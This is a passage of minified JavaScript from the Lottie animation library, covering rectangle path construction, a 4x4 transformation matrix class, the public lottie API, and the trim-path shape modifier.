                  this.dynamicProperties.length
                    ? (this.k = !0)
                    : ((this.k = !1), this.convertRectToPath());
              }
              return (
                (bt.prototype = {
                  convertRectToPath: function () {
                    var yt = this.p.v[0],
                      wt = this.p.v[1],
                      $t = this.s.v[0] / 2,
                      kt = this.s.v[1] / 2,
                      Rt = bmMin($t, kt, this.r.v),
                      It = Rt * (1 - roundCorner);
                    (this.v._length = 0),
                      this.d === 2 || this.d === 1
                        ? (this.v.setTripleAt(
                            yt + $t,
                            wt - kt + Rt,
                            yt + $t,
                            wt - kt + Rt,
                            yt + $t,
                            wt - kt + It,
                            0,
                            !0
                          ),
                          this.v.setTripleAt(
                            yt + $t,
                            wt + kt - Rt,
                            yt + $t,
                            wt + kt - It,
                            yt + $t,
                            wt + kt - Rt,
                            1,
                            !0
                          ),
                          Rt !== 0
                            ? (this.v.setTripleAt(
                                yt + $t - Rt,
                                wt + kt,
                                yt + $t - Rt,
                                wt + kt,
                                yt + $t - It,
                                wt + kt,
                                2,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t + Rt,
                                wt + kt,
                                yt - $t + It,
                                wt + kt,
                                yt - $t + Rt,
                                wt + kt,
                                3,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt + kt - Rt,
                                yt - $t,
                                wt + kt - Rt,
                                yt - $t,
                                wt + kt - It,
                                4,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt - kt + Rt,
                                yt - $t,
                                wt - kt + It,
                                yt - $t,
                                wt - kt + Rt,
                                5,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t + Rt,
                                wt - kt,
                                yt - $t + Rt,
                                wt - kt,
                                yt - $t + It,
                                wt - kt,
                                6,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt + $t - Rt,
                                wt - kt,
                                yt + $t - It,
                                wt - kt,
                                yt + $t - Rt,
                                wt - kt,
                                7,
                                !0
                              ))
                            : (this.v.setTripleAt(
                                yt - $t,
                                wt + kt,
                                yt - $t + It,
                                wt + kt,
                                yt - $t,
                                wt + kt,
                                2
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt - kt,
                                yt - $t,
                                wt - kt + It,
                                yt - $t,
                                wt - kt,
                                3
                              )))
                        : (this.v.setTripleAt(
                            yt + $t,
                            wt - kt + Rt,
                            yt + $t,
                            wt - kt + It,
                            yt + $t,
                            wt - kt + Rt,
                            0,
                            !0
                          ),
                          Rt !== 0
                            ? (this.v.setTripleAt(
                                yt + $t - Rt,
                                wt - kt,
                                yt + $t - Rt,
                                wt - kt,
                                yt + $t - It,
                                wt - kt,
                                1,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t + Rt,
                                wt - kt,
                                yt - $t + It,
                                wt - kt,
                                yt - $t + Rt,
                                wt - kt,
                                2,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt - kt + Rt,
                                yt - $t,
                                wt - kt + Rt,
                                yt - $t,
                                wt - kt + It,
                                3,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt + kt - Rt,
                                yt - $t,
                                wt + kt - It,
                                yt - $t,
                                wt + kt - Rt,
                                4,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t + Rt,
                                wt + kt,
                                yt - $t + Rt,
                                wt + kt,
                                yt - $t + It,
                                wt + kt,
                                5,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt + $t - Rt,
                                wt + kt,
                                yt + $t - It,
                                wt + kt,
                                yt + $t - Rt,
                                wt + kt,
                                6,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt + $t,
                                wt + kt - Rt,
                                yt + $t,
                                wt + kt - Rt,
                                yt + $t,
                                wt + kt - It,
                                7,
                                !0
                              ))
                            : (this.v.setTripleAt(
                                yt - $t,
                                wt - kt,
                                yt - $t + It,
                                wt - kt,
                                yt - $t,
                                wt - kt,
                                1,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt - $t,
                                wt + kt,
                                yt - $t,
                                wt + kt - It,
                                yt - $t,
                                wt + kt,
                                2,
                                !0
                              ),
                              this.v.setTripleAt(
                                yt + $t,
                                wt + kt,
                                yt + $t - It,
                                wt + kt,
                                yt + $t,
                                wt + kt,
                                3,
                                !0
                              )));
                  },
                  getValue: function () {
                    this.elem.globalData.frameId !== this.frameId &&
                      ((this.frameId = this.elem.globalData.frameId),
                      this.iterateDynamicProperties(),
                      this._mdf && this.convertRectToPath());
                  },
                  reset: s,
                }),
                extendPrototype([DynamicPropertyContainer], bt),
                bt
              );
            })();
          function _t(bt, xt, yt) {
            var wt;
            if (yt === 3 || yt === 4) {
              var $t = yt === 3 ? xt.pt : xt.ks,
                kt = $t.k;
              kt.length ? (wt = new ht(bt, xt, yt)) : (wt = new st(bt, xt, yt));
            } else
              yt === 5
                ? (wt = new vt(bt, xt))
                : yt === 6
                ? (wt = new gt(bt, xt))
                : yt === 7 && (wt = new St(bt, xt));
            return wt.k && bt.addDynamicProperty(wt), wt;
          }
          function Et() {
            return st;
          }
          function Ct() {
            return ht;
          }
          var Pt = {};
          return (
            (Pt.getShapeProp = _t),
            (Pt.getConstructorFunction = Et),
            (Pt.getKeyframedConstructorFunction = Ct),
            Pt
          );
        })();
      /*!
 Transformation Matrix v2.0
 (c) Epistemex 2014-2015
 www.epistemex.com
 By Ken Fyrstenberg
 Contributions by leeoniya.
 License: MIT, header required.
 */ var Matrix = (function () {
        var i = Math.cos,
          a = Math.sin,
          o = Math.tan,
          s = Math.round;
        function tt() {
          return (
            (this.props[0] = 1),
            (this.props[1] = 0),
            (this.props[2] = 0),
            (this.props[3] = 0),
            (this.props[4] = 0),
            (this.props[5] = 1),
            (this.props[6] = 0),
            (this.props[7] = 0),
            (this.props[8] = 0),
            (this.props[9] = 0),
            (this.props[10] = 1),
            (this.props[11] = 0),
            (this.props[12] = 0),
            (this.props[13] = 0),
            (this.props[14] = 0),
            (this.props[15] = 1),
            this
          );
        }
        function nt(Tt) {
          if (Tt === 0) return this;
          var At = i(Tt),
            Lt = a(Tt);
          return this._t(At, -Lt, 0, 0, Lt, At, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
        }
        function ot(Tt) {
          if (Tt === 0) return this;
          var At = i(Tt),
            Lt = a(Tt);
          return this._t(1, 0, 0, 0, 0, At, -Lt, 0, 0, Lt, At, 0, 0, 0, 0, 1);
        }
        function st(Tt) {
          if (Tt === 0) return this;
          var At = i(Tt),
            Lt = a(Tt);
          return this._t(At, 0, Lt, 0, 0, 1, 0, 0, -Lt, 0, At, 0, 0, 0, 0, 1);
        }
        function ft(Tt) {
          if (Tt === 0) return this;
          var At = i(Tt),
            Lt = a(Tt);
          return this._t(At, -Lt, 0, 0, Lt, At, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
        }
        function ht(Tt, At) {
          return this._t(1, At, Tt, 1, 0, 0);
        }
        function gt(Tt, At) {
          return this.shear(o(Tt), o(At));
        }
        function St(Tt, At) {
          var Lt = i(At),
            jt = a(At);
          return this._t(Lt, jt, 0, 0, -jt, Lt, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1)
            ._t(1, 0, 0, 0, o(Tt), 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1)
            ._t(Lt, -jt, 0, 0, jt, Lt, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);
        }
        function vt(Tt, At, Lt) {
          return (
            !Lt && Lt !== 0 && (Lt = 1),
            Tt === 1 && At === 1 && Lt === 1
              ? this
              : this._t(Tt, 0, 0, 0, 0, At, 0, 0, 0, 0, Lt, 0, 0, 0, 0, 1)
          );
        }
        function _t(
          Tt,
          At,
          Lt,
          jt,
          Dt,
          Ut,
          Ht,
          Kt,
          qt,
          Qt,
          Zt,
          Jt,
          er,
          sr,
          nr,
          tr
        ) {
          return (
            (this.props[0] = Tt),
            (this.props[1] = At),
            (this.props[2] = Lt),
            (this.props[3] = jt),
            (this.props[4] = Dt),
            (this.props[5] = Ut),
            (this.props[6] = Ht),
            (this.props[7] = Kt),
            (this.props[8] = qt),
            (this.props[9] = Qt),
            (this.props[10] = Zt),
            (this.props[11] = Jt),
            (this.props[12] = er),
            (this.props[13] = sr),
            (this.props[14] = nr),
            (this.props[15] = tr),
            this
          );
        }
        function Et(Tt, At, Lt) {
          return (
            (Lt = Lt || 0),
            Tt !== 0 || At !== 0 || Lt !== 0
              ? this._t(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, Tt, At, Lt, 1)
              : this
          );
        }
        function Ct(
          Tt,
          At,
          Lt,
          jt,
          Dt,
          Ut,
          Ht,
          Kt,
          qt,
          Qt,
          Zt,
          Jt,
          er,
          sr,
          nr,
          tr
        ) {
          var Xt = this.props;
          if (
            Tt === 1 &&
            At === 0 &&
            Lt === 0 &&
            jt === 0 &&
            Dt === 0 &&
            Ut === 1 &&
            Ht === 0 &&
            Kt === 0 &&
            qt === 0 &&
            Qt === 0 &&
            Zt === 1 &&
            Jt === 0
          )
            return (
              (Xt[12] = Xt[12] * Tt + Xt[15] * er),
              (Xt[13] = Xt[13] * Ut + Xt[15] * sr),
              (Xt[14] = Xt[14] * Zt + Xt[15] * nr),
              (Xt[15] *= tr),
              (this._identityCalculated = !1),
              this
            );
          var hr = Xt[0],
            cr = Xt[1],
            yr = Xt[2],
            vr = Xt[3],
            xr = Xt[4],
            Sr = Xt[5],
            or = Xt[6],
            mr = Xt[7],
            Yt = Xt[8],
            rr = Xt[9],
            ar = Xt[10],
            gr = Xt[11],
            br = Xt[12],
            Cr = Xt[13],
            Rr = Xt[14],
            Ar = Xt[15];
          return (
            (Xt[0] = hr * Tt + cr * Dt + yr * qt + vr * er),
            (Xt[1] = hr * At + cr * Ut + yr * Qt + vr * sr),
            (Xt[2] = hr * Lt + cr * Ht + yr * Zt + vr * nr),
            (Xt[3] = hr * jt + cr * Kt + yr * Jt + vr * tr),
            (Xt[4] = xr * Tt + Sr * Dt + or * qt + mr * er),
            (Xt[5] = xr * At + Sr * Ut + or * Qt + mr * sr),
            (Xt[6] = xr * Lt + Sr * Ht + or * Zt + mr * nr),
            (Xt[7] = xr * jt + Sr * Kt + or * Jt + mr * tr),
            (Xt[8] = Yt * Tt + rr * Dt + ar * qt + gr * er),
            (Xt[9] = Yt * At + rr * Ut + ar * Qt + gr * sr),
            (Xt[10] = Yt * Lt + rr * Ht + ar * Zt + gr * nr),
            (Xt[11] = Yt * jt + rr * Kt + ar * Jt + gr * tr),
            (Xt[12] = br * Tt + Cr * Dt + Rr * qt + Ar * er),
            (Xt[13] = br * At + Cr * Ut + Rr * Qt + Ar * sr),
            (Xt[14] = br * Lt + Cr * Ht + Rr * Zt + Ar * nr),
            (Xt[15] = br * jt + Cr * Kt + Rr * Jt + Ar * tr),
            (this._identityCalculated = !1),
            this
          );
        }
        function Pt(Tt) {
          var At = Tt.props;
          return this.transform(
            At[0],
            At[1],
            At[2],
            At[3],
            At[4],
            At[5],
            At[6],
            At[7],
            At[8],
            At[9],
            At[10],
            At[11],
            At[12],
            At[13],
            At[14],
            At[15]
          );
        }
        function bt() {
          return (
            this._identityCalculated ||
              ((this._identity = !(
                this.props[0] !== 1 ||
                this.props[1] !== 0 ||
                this.props[2] !== 0 ||
                this.props[3] !== 0 ||
                this.props[4] !== 0 ||
                this.props[5] !== 1 ||
                this.props[6] !== 0 ||
                this.props[7] !== 0 ||
                this.props[8] !== 0 ||
                this.props[9] !== 0 ||
                this.props[10] !== 1 ||
                this.props[11] !== 0 ||
                this.props[12] !== 0 ||
                this.props[13] !== 0 ||
                this.props[14] !== 0 ||
                this.props[15] !== 1
              )),
              (this._identityCalculated = !0)),
            this._identity
          );
        }
        function xt(Tt) {
          for (var At = 0; At < 16; ) {
            if (Tt.props[At] !== this.props[At]) return !1;
            At += 1;
          }
          return !0;
        }
        function yt(Tt) {
          var At;
          for (At = 0; At < 16; At += 1) Tt.props[At] = this.props[At];
          return Tt;
        }
        function wt(Tt) {
          var At;
          for (At = 0; At < 16; At += 1) this.props[At] = Tt[At];
        }
        function $t(Tt, At, Lt) {
          return {
            x:
              Tt * this.props[0] +
              At * this.props[4] +
              Lt * this.props[8] +
              this.props[12],
            y:
              Tt * this.props[1] +
              At * this.props[5] +
              Lt * this.props[9] +
              this.props[13],
            z:
              Tt * this.props[2] +
              At * this.props[6] +
              Lt * this.props[10] +
              this.props[14],
          };
        }
        function kt(Tt, At, Lt) {
          return (
            Tt * this.props[0] +
            At * this.props[4] +
            Lt * this.props[8] +
            this.props[12]
          );
        }
        function Rt(Tt, At, Lt) {
          return (
            Tt * this.props[1] +
            At * this.props[5] +
            Lt * this.props[9] +
            this.props[13]
          );
        }
        function It(Tt, At, Lt) {
          return (
            Tt * this.props[2] +
            At * this.props[6] +
            Lt * this.props[10] +
            this.props[14]
          );
        }
        function Ot() {
          var Tt =
              this.props[0] * this.props[5] - this.props[1] * this.props[4],
            At = this.props[5] / Tt,
            Lt = -this.props[1] / Tt,
            jt = -this.props[4] / Tt,
            Dt = this.props[0] / Tt,
            Ut =
              (this.props[4] * this.props[13] -
                this.props[5] * this.props[12]) /
              Tt,
            Ht =
              -(
                this.props[0] * this.props[13] -
                this.props[1] * this.props[12]
              ) / Tt,
            Kt = new Matrix();
          return (
            (Kt.props[0] = At),
            (Kt.props[1] = Lt),
            (Kt.props[4] = jt),
            (Kt.props[5] = Dt),
            (Kt.props[12] = Ut),
            (Kt.props[13] = Ht),
            Kt
          );
        }
        function Nt(Tt) {
          var At = this.getInverseMatrix();
          return At.applyToPointArray(Tt[0], Tt[1], Tt[2] || 0);
        }
        function zt(Tt) {
          var At,
            Lt = Tt.length,
            jt = [];
          for (At = 0; At < Lt; At += 1) jt[At] = Nt(Tt[At]);
          return jt;
        }
        function Bt(Tt, At, Lt) {
          var jt = createTypedArray("float32", 6);
          if (this.isIdentity())
            (jt[0] = Tt[0]),
              (jt[1] = Tt[1]),
              (jt[2] = At[0]),
              (jt[3] = At[1]),
              (jt[4] = Lt[0]),
              (jt[5] = Lt[1]);
          else {
            var Dt = this.props[0],
              Ut = this.props[1],
              Ht = this.props[4],
              Kt = this.props[5],
              qt = this.props[12],
              Qt = this.props[13];
            (jt[0] = Tt[0] * Dt + Tt[1] * Ht + qt),
              (jt[1] = Tt[0] * Ut + Tt[1] * Kt + Qt),
              (jt[2] = At[0] * Dt + At[1] * Ht + qt),
              (jt[3] = At[0] * Ut + At[1] * Kt + Qt),
              (jt[4] = Lt[0] * Dt + Lt[1] * Ht + qt),
              (jt[5] = Lt[0] * Ut + Lt[1] * Kt + Qt);
          }
          return jt;
        }
        function Wt(Tt, At, Lt) {
          var jt;
          return (
            this.isIdentity()
              ? (jt = [Tt, At, Lt])
              : (jt = [
                  Tt * this.props[0] +
                    At * this.props[4] +
                    Lt * this.props[8] +
                    this.props[12],
                  Tt * this.props[1] +
                    At * this.props[5] +
                    Lt * this.props[9] +
                    this.props[13],
                  Tt * this.props[2] +
                    At * this.props[6] +
                    Lt * this.props[10] +
                    this.props[14],
                ]),
            jt
          );
        }
        function Gt(Tt, At) {
          if (this.isIdentity()) return Tt + "," + At;
          var Lt = this.props;
          return (
            Math.round((Tt * Lt[0] + At * Lt[4] + Lt[12]) * 100) / 100 +
            "," +
            Math.round((Tt * Lt[1] + At * Lt[5] + Lt[13]) * 100) / 100
          );
        }
        function Vt() {
          for (
            var Tt = 0, At = this.props, Lt = "matrix3d(", jt = 1e4;
            Tt < 16;

          )
            (Lt += s(At[Tt] * jt) / jt),
              (Lt += Tt === 15 ? ")" : ","),
              (Tt += 1);
          return Lt;
        }
        function Mt(Tt) {
          var At = 1e4;
          return (Tt < 1e-6 && Tt > 0) || (Tt > -1e-6 && Tt < 0)
            ? s(Tt * At) / At
            : Tt;
        }
        function Ft() {
          var Tt = this.props,
            At = Mt(Tt[0]),
            Lt = Mt(Tt[1]),
            jt = Mt(Tt[4]),
            Dt = Mt(Tt[5]),
            Ut = Mt(Tt[12]),
            Ht = Mt(Tt[13]);
          return (
            "matrix(" +
            At +
            "," +
            Lt +
            "," +
            jt +
            "," +
            Dt +
            "," +
            Ut +
            "," +
            Ht +
            ")"
          );
        }
        return function () {
          (this.reset = tt),
            (this.rotate = nt),
            (this.rotateX = ot),
            (this.rotateY = st),
            (this.rotateZ = ft),
            (this.skew = gt),
            (this.skewFromAxis = St),
            (this.shear = ht),
            (this.scale = vt),
            (this.setTransform = _t),
            (this.translate = Et),
            (this.transform = Ct),
            (this.multiply = Pt),
            (this.applyToPoint = $t),
            (this.applyToX = kt),
            (this.applyToY = Rt),
            (this.applyToZ = It),
            (this.applyToPointArray = Wt),
            (this.applyToTriplePoints = Bt),
            (this.applyToPointStringified = Gt),
            (this.toCSS = Vt),
            (this.to2dCSS = Ft),
            (this.clone = yt),
            (this.cloneFromProps = wt),
            (this.equals = xt),
            (this.inversePoints = zt),
            (this.inversePoint = Nt),
            (this.getInverseMatrix = Ot),
            (this._t = this.transform),
            (this.isIdentity = bt),
            (this._identity = !0),
            (this._identityCalculated = !1),
            (this.props = createTypedArray("float32", 16)),
            this.reset();
        };
      })();
      function _typeof$3(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$3 = function (o) {
                return typeof o;
              })
            : (_typeof$3 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$3(i)
        );
      }
      var lottie = {};
      function setLocation(i) {
        setLocationHref(i);
      }
      function searchAnimations() {
        animationManager.searchAnimations();
      }
      function setSubframeRendering(i) {
        setSubframeEnabled(i);
      }
      function setPrefix(i) {
        setIdPrefix(i);
      }
      function loadAnimation(i) {
        return animationManager.loadAnimation(i);
      }
      function setQuality(i) {
        if (typeof i == "string")
          switch (i) {
            case "high":
              setDefaultCurveSegments(200);
              break;
            default:
            case "medium":
              setDefaultCurveSegments(50);
              break;
            case "low":
              setDefaultCurveSegments(10);
              break;
          }
        else !isNaN(i) && i > 1 && setDefaultCurveSegments(i);
      }
      function inBrowser() {
        return typeof navigator < "u";
      }
      function installPlugin(i, a) {
        i === "expressions" && setExpressionsPlugin(a);
      }
      function getFactory(i) {
        switch (i) {
          case "propertyFactory":
            return PropertyFactory;
          case "shapePropertyFactory":
            return ShapePropertyFactory;
          case "matrix":
            return Matrix;
          default:
            return null;
        }
      }
      (lottie.play = animationManager.play),
        (lottie.pause = animationManager.pause),
        (lottie.setLocationHref = setLocation),
        (lottie.togglePause = animationManager.togglePause),
        (lottie.setSpeed = animationManager.setSpeed),
        (lottie.setDirection = animationManager.setDirection),
        (lottie.stop = animationManager.stop),
        (lottie.searchAnimations = searchAnimations),
        (lottie.registerAnimation = animationManager.registerAnimation),
        (lottie.loadAnimation = loadAnimation),
        (lottie.setSubframeRendering = setSubframeRendering),
        (lottie.resize = animationManager.resize),
        (lottie.goToAndStop = animationManager.goToAndStop),
        (lottie.destroy = animationManager.destroy),
        (lottie.setQuality = setQuality),
        (lottie.inBrowser = inBrowser),
        (lottie.installPlugin = installPlugin),
        (lottie.freeze = animationManager.freeze),
        (lottie.unfreeze = animationManager.unfreeze),
        (lottie.setVolume = animationManager.setVolume),
        (lottie.mute = animationManager.mute),
        (lottie.unmute = animationManager.unmute),
        (lottie.getRegisteredAnimations =
          animationManager.getRegisteredAnimations),
        (lottie.useWebWorker = setWebWorker),
        (lottie.setIDPrefix = setPrefix),
        (lottie.__getFactory = getFactory),
        (lottie.version = "5.12.2");
      function checkReady() {
        document.readyState === "complete" &&
          (clearInterval(readyStateCheckInterval), searchAnimations());
      }
      function getQueryVariable(i) {
        for (var a = queryString.split("&"), o = 0; o < a.length; o += 1) {
          var s = a[o].split("=");
          if (decodeURIComponent(s[0]) == i) return decodeURIComponent(s[1]);
        }
        return null;
      }
      var queryString = "";
      {
        var scripts = document.getElementsByTagName("script"),
          index = scripts.length - 1,
          myScript = scripts[index] || { src: "" };
        (queryString = myScript.src
          ? myScript.src.replace(/^[^\?]+\??/, "")
          : ""),
          getQueryVariable("renderer");
      }
      var readyStateCheckInterval = setInterval(checkReady, 100);
      try {
        _typeof$3(exports) !== "object" && (window.bodymovin = lottie);
      } catch (i) {}
      var ShapeModifiers = (function () {
        var i = {},
          a = {};
        (i.registerModifier = o), (i.getModifier = s);
        function o(tt, nt) {
          a[tt] || (a[tt] = nt);
        }
        function s(tt, nt, ot) {
          return new a[tt](nt, ot);
        }
        return i;
      })();
      function ShapeModifier() {}
      (ShapeModifier.prototype.initModifierProperties = function () {}),
        (ShapeModifier.prototype.addShapeToModifier = function () {}),
        (ShapeModifier.prototype.addShape = function (i) {
          if (!this.closed) {
            i.sh.container.addDynamicProperty(i.sh);
            var a = {
              shape: i.sh,
              data: i,
              localShapeCollection: shapeCollectionPool.newShapeCollection(),
            };
            this.shapes.push(a),
              this.addShapeToModifier(a),
              this._isAnimated && i.setAsAnimated();
          }
        }),
        (ShapeModifier.prototype.init = function (i, a) {
          (this.shapes = []),
            (this.elem = i),
            this.initDynamicPropertyContainer(i),
            this.initModifierProperties(i, a),
            (this.frameId = initialDefaultFrame),
            (this.closed = !1),
            (this.k = !1),
            this.dynamicProperties.length ? (this.k = !0) : this.getValue(!0);
        }),
        (ShapeModifier.prototype.processKeys = function () {
          this.elem.globalData.frameId !== this.frameId &&
            ((this.frameId = this.elem.globalData.frameId),
            this.iterateDynamicProperties());
        }),
        extendPrototype([DynamicPropertyContainer], ShapeModifier);
      function TrimModifier() {}
      extendPrototype([ShapeModifier], TrimModifier),
        (TrimModifier.prototype.initModifierProperties = function (i, a) {
          (this.s = PropertyFactory.getProp(i, a.s, 0, 0.01, this)),
            (this.e = PropertyFactory.getProp(i, a.e, 0, 0.01, this)),
            (this.o = PropertyFactory.getProp(i, a.o, 0, 0, this)),
            (this.sValue = 0),
            (this.eValue = 0),
            (this.getValue = this.processKeys),
            (this.m = a.m),
            (this._isAnimated =
              !!this.s.effectsSequence.length ||
              !!this.e.effectsSequence.length ||
              !!this.o.effectsSequence.length);
        }),
        (TrimModifier.prototype.addShapeToModifier = function (i) {
          i.pathsData = [];
        }),
        (TrimModifier.prototype.calculateShapeEdges = function (
          i,
          a,
          o,
          s,
          tt
        ) {
          var nt = [];
          a <= 1
            ? nt.push({ s: i, e: a })
            : i >= 1
            ? nt.push({ s: i - 1, e: a - 1 })
            : (nt.push({ s: i, e: 1 }), nt.push({ s: 0, e: a - 1 }));
          var ot = [],
            st,
            ft = nt.length,
            ht;
          for (st = 0; st < ft; st += 1)
            if (((ht = nt[st]), !(ht.e * tt < s || ht.s * tt > s + o))) {
              var gt, St;
              ht.s * tt <= s ? (gt = 0) : (gt = (ht.s * tt - s) / o),
                ht.e * tt >= s + o ? (St = 1) : (St = (ht.e * tt - s) / o),
                ot.push([gt, St]);
            }
          return ot.length || ot.push([0, 0]), ot;
        }),
        (TrimModifier.prototype.releasePathsData = function (i) {
          var a,
            o = i.length;
          for (a = 0; a < o; a += 1) segmentsLengthPool.release(i[a]);
          return (i.length = 0), i;
        }),
        (TrimModifier.prototype.processShapes = function (i) {
          var a, o;
          if (this._mdf || i) {
            var s = (this.o.v % 360) / 360;
            if (
              (s < 0 && (s += 1),
              this.s.v > 1
                ? (a = 1 + s)
                : this.s.v < 0
                ? (a = 0 + s)
                : (a = this.s.v + s),
              this.e.v > 1
                ? (o = 1 + s)
                : this.e.v < 0
                ? (o = 0 + s)
                : (o = this.e.v + s),
              a > o)
            ) {
              var tt = a;
              (a = o), (o = tt);
            }
            (a = Math.round(a * 1e4) * 1e-4),
              (o = Math.round(o * 1e4) * 1e-4),
              (this.sValue = a),
              (this.eValue = o);
          } else (a = this.sValue), (o = this.eValue);
          var nt,
            ot,
            st = this.shapes.length,
            ft,
            ht,
            gt,
            St,
            vt,
            _t = 0;
          if (o === a)
            for (ot = 0; ot < st; ot += 1)
              this.shapes[ot].localShapeCollection.releaseShapes(),
                (this.shapes[ot].shape._mdf = !0),
                (this.shapes[ot].shape.paths =
                  this.shapes[ot].localShapeCollection),
                this._mdf && (this.shapes[ot].pathsData.length = 0);
          else if ((o === 1 && a === 0) || (o === 0 && a === 1)) {
            if (this._mdf)
              for (ot = 0; ot < st; ot += 1)
                (this.shapes[ot].pathsData.length = 0),
                  (this.shapes[ot].shape._mdf = !0);
          } else {
            var Et = [],
              Ct,
              Pt;
            for (ot = 0; ot < st; ot += 1)
              if (
                ((Ct = this.shapes[ot]),
                !Ct.shape._mdf && !this._mdf && !i && this.m !== 2)
              )
                Ct.shape.paths = Ct.localShapeCollection;
              else {
                if (
                  ((nt = Ct.shape.paths),
                  (ht = nt._length),
                  (vt = 0),
                  !Ct.shape._mdf && Ct.pathsData.length)
                )
                  vt = Ct.totalShapeLength;
                else {
                  for (
                    gt = this.releasePathsData(Ct.pathsData), ft = 0;
                    ft < ht;
                    ft += 1
                  )
                    (St = bez.getSegmentsLength(nt.shapes[ft])),
                      gt.push(St),
                      (vt += St.totalLength);
                  (Ct.totalShapeLength = vt), (Ct.pathsData = gt);
                }
                (_t += vt), (Ct.shape._mdf = !0);
              }
            var bt = a,
              xt = o,
              yt = 0,
              wt;
            for (ot = st - 1; ot >= 0; ot -= 1)
              if (((Ct = this.shapes[ot]), Ct.shape._mdf)) {
                for (
                  Pt = Ct.localShapeCollection,
                    Pt.releaseShapes(),
                    this.m === 2 && st > 1
                      ? ((wt = this.calculateShapeEdges(
                          a,
                          o,
                          Ct.totalShapeLength,
                          yt,
                          _t
                        )),
                        (yt += Ct.totalShapeLength))
                      : (wt = [[bt, xt]]),
                    ht = wt.length,
                    ft = 0;
                  ft < ht;
                  ft += 1
                ) {
                  (bt = wt[ft][0]),
                    (xt = wt[ft][1]),
                    (Et.length = 0),
                    xt <= 1
                      ? Et.push({
                          s: Ct.totalShapeLength * bt,
                          e: Ct.totalShapeLength * xt,
                        })
                      : bt >= 1
                      ? Et.push({
                          s: Ct.totalShapeLength * (bt - 1),
                          e: Ct.totalShapeLength * (xt - 1),
                        })
                      : (Et.push({
                          s: Ct.totalShapeLength * bt,
                          e: Ct.totalShapeLength,
                        }),
                        Et.push({ s: 0, e: Ct.totalShapeLength * (xt - 1) }));
                  var $t = this.addShapes(Ct, Et[0]);
                  if (Et[0].s !== Et[0].e) {
                    if (Et.length > 1) {
                      var kt =
                        Ct.shape.paths.shapes[Ct.shape.paths._length - 1];
                      if (kt.c) {
                        var Rt = $t.pop();
                        this.addPaths($t, Pt),
                          ($t = this.addShapes(Ct, Et[1], Rt));
                      } else
                        this.addPaths($t, Pt), ($t = this.addShapes(Ct, Et[1]));
                    }
                    this.addPaths($t, Pt);
                  }
                }
                Ct.shape.paths = Pt;
              }
          }
        }),
        (TrimModifier.prototype.addPaths = function (i, a) {
          var o,
            s = i.length;
          for (o = 0; o < s; o += 1) a.addShape(i[o]);
        }),
        (TrimModifier.prototype.addSegment = function (i, a, o, s, tt, nt, ot) {
          tt.setXYAt(a[0], a[1], "o", nt),
            tt.setXYAt(o[0], o[1], "i", nt + 1),
            ot && tt.setXYAt(i[0], i[1], "v", nt),
            tt.setXYAt(s[0], s[1], "v", nt + 1);
        }),
        (TrimModifier.prototype.addSegmentFromArray = function (i, a, o, s) {
          a.setXYAt(i[1], i[5], "o", o),
            a.setXYAt(i[2], i[6], "i", o + 1),
            s && a.setXYAt(i[0], i[4], "v", o),
            a.setXYAt(i[3], i[7], "v", o + 1);
        }),
        (TrimModifier.prototype.addShapes = function (i, a, o) {
          var s = i.pathsData,
            tt = i.shape.paths.shapes,
            nt,
            ot = i.shape.paths._length,
            st,
            ft,
            ht = 0,
            gt,
            St,
            vt,
            _t,
            Et = [],
            Ct,
            Pt = !0;
          for (
            o
              ? ((St = o._length), (Ct = o._length))
              : ((o = shapePool.newElement()), (St = 0), (Ct = 0)),
              Et.push(o),
              nt = 0;
            nt < ot;
            nt += 1
          ) {
            for (
              vt = s[nt].lengths,
                o.c = tt[nt].c,
                ft = tt[nt].c ? vt.length : vt.length + 1,
                st = 1;
              st < ft;
              st += 1
            )
              if (((gt = vt[st - 1]), ht + gt.addedLength < a.s))
                (ht += gt.addedLength), (o.c = !1);
              else if (ht > a.e) {
                o.c = !1;
                break;
              } else
                a.s <= ht && a.e >= ht + gt.addedLength
                  ? (this.addSegment(
                      tt[nt].v[st - 1],
                      tt[nt].o[st - 1],
                      tt[nt].i[st],
                      tt[nt].v[st],
                      o,
                      St,
                      Pt
                    ),
                    (Pt = !1))
                  : ((_t = bez.getNewSegment(
                      tt[nt].v[st - 1],
                      tt[nt].v[st],
                      tt[nt].o[st - 1],
                      tt[nt].i[st],
                      (a.s - ht) / gt.addedLength,
                      (a.e - ht) / gt.addedLength,
                      vt[st - 1]
                    )),
                    this.addSegmentFromArray(_t, o, St, Pt),
                    (Pt = !1),
                    (o.c = !1)),
                  (ht += gt.addedLength),
                  (St += 1);
            if (tt[nt].c && vt.length) {
              if (((gt = vt[st - 1]), ht <= a.e)) {
                var bt = vt[st - 1].addedLength;
                a.s <= ht && a.e >= ht + bt
                  ? (this.addSegment(
                      tt[nt].v[st - 1],
                      tt[nt].o[st - 1],
                      tt[nt].i[0],
                      tt[nt].v[0],
                      o,
                      St,
                      Pt
                    ),
                    (Pt = !1))
                  : ((_t = bez.getNewSegment(
                      tt[nt].v[st - 1],
                      tt[nt].v[0],
                      tt[nt].o[st - 1],
                      tt[nt].i[0],
                      (a.s - ht) / bt,
                      (a.e - ht) / bt,
                      vt[st - 1]
                    )),
                    this.addSegmentFromArray(_t, o, St, Pt),
                    (Pt = !1),
                    (o.c = !1));
              } else o.c = !1;
